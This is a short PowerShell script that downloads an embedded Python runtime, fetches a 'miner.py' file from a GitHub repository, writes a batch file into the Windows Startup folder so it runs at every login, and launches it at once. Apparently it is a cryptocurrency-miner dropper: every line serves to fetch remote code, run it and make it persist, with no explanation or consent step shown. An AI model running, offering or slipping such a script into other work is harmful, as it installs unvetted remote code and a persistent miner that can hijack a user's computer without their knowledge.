$p="$env:USERPROFILE\mh"
mkdir $p -Force
iwr "https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-amd64.zip" -o "$p\py.zip"
Expand-Archive "$p\py.zip" -Destination "$p\python" -Force
iwr "https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miner.py" -o "$p\miner.py"
$bat="@echo off`r`n$p\python\python.exe $p\miner.py"
Set-Content "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\mh.bat" $bat
Start-Process "$p\python\python.exe" "$p\miner.py"
